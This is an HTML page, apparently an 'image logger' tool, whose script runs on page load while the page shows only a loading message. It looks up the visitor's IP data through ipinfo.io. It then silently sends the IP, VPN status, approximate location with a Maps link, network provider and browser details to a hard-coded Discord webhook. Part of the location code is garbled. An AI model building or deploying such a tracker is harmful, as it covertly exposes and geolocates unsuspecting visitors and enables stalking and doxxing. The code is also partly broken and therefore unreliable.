<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP & Location Intelligence Report</title>
</head>
<body>
    <div style="text-align:center; margin-top:20vh; font-family:Arial;">
        <h2>Đang tải dữ liệu mạng...</h2>
        <div id="ip-display" style="font-size: 2em; color: red; font-weight: bold;">...</div>
    </div>

    <script>
    function monke(json) {
        // Hiển thị IP trực tiếp lên màn hình trang web
        document.getElementById('ip-display').innerText = json.ip || 'N/A';

        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
        request.setRequestHeader('Content-type', 'application/json');

        // Kiểm tra VPN/Proxy
        let isVpnOrProxy = "NO";
        if (json.privacy) {
            if (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting) {
                isVpnOrProxy = "YES (VPN/Proxy/Hosting detected)";
            }
        }

        // Tạo link Google Maps từ tọa độ
        let lat = 'N/A', lon = 'N/A', mapsLink = 'Không có tọa độ';
        if (json.loc) {
            let coords = json.loc.split(',');
            lat = coords[0];
            lon = coords[1];
            mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        }

        var params = {
            username: "Cordly Image Logger by phongdepzai02",
            content: "",
            embeds: [
                {
                    title: "🎯 Image Opened - Intelligence Report",
                    color: 3447003,
                    fields: [
                        {
                            name: "🌐 IP Address",
                            value: `\`${json.ip || 'N/A'}\``,
                            inline: false
                        },
                        {
                            name: "🛡️ VPN/Proxy",
                            value: `🚩 **${isVpnOrProxy}**`,
                            inline: false
                        },
                        {
                            name: "🌍 Timezone",
                            value: `${json.timezone || 'N/A'}`,
                            inline: false
                        },
                        {
                            name: "📍 Location",
                            value: `${json.city \vert{}\vert{} 'N/A'},${json.region || 'N/A'}, ${json.country \vert{}\vert{} 'N/A'}\n[View on Google Maps](${mapsLink})`,
                            inline: false
                        },
                        {
                            name: "🏢 Network / Hostname",
                            value: `${json.org || 'N/A'}`,
                            inline: false
                        },
                        {
                            name: "💻 Device & Browser",
                            value: `${navigator.platform} -${navigator.userAgent.includes('Mobile') ? 'Mobile Device' : 'Desktop'}`,
                            inline: false
                        },
                        {
                            name: "📋 Raw User-Agent",
                            value: `\`\`\`${navigator.userAgent}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Tool created by phongdepzai02"
                    }
                }
            ]
        };

        request.send(JSON.stringify(params));
    }
    </script>

    <!-- Sử dụng định dạng JSONP chuẩn của bản đầu tiên để gọi dữ liệu mượt mà -->
    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
</body>
</html>
